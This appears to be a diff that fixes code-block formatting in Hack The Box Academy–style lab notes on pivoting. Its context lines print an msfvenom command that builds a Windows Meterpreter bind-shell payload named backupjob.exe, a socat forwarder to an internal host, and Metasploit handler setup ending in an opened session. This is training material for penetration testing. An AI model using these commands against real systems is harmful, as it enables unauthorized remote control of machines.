@@ -8,8 +8,7 @@ We can create a bind shell using msfvenom with the below command.
 
 #### Creating the Windows Payload
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -24,8 +23,7 @@ We can start a `socat bind shell` listener, which listens on port `8080` and for
 
 #### Starting Socat Bind Shell Listener
 
-```
-        shellsession
+```shellsession
 ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
 ```
 
@@ -33,8 +31,7 @@ Finally, we can start a Metasploit bind handler. This bind handler can be config
 
 #### Configuring & Starting the Bind multi/handler
 
-```
-        shellsession
+```shellsession
 msf6 > use exploit/multi/handler
 
 [*] Using configured payload generic/shell_reverse_tcp
@@ -53,8 +50,7 @@ We can see a bind handler connected to a stage request pivoted via a socat liste
 
 #### Establishing Meterpreter Session
 
-```
-        shellsession
+```shellsession
 [*] Sending stage (200262 bytes) to 10.129.202.64
 [*] Meterpreter session 1 opened (10.10.14.18:46253 -> 10.129.202.64:8080 ) at 2022-03-07 12:44:44 -0500
 
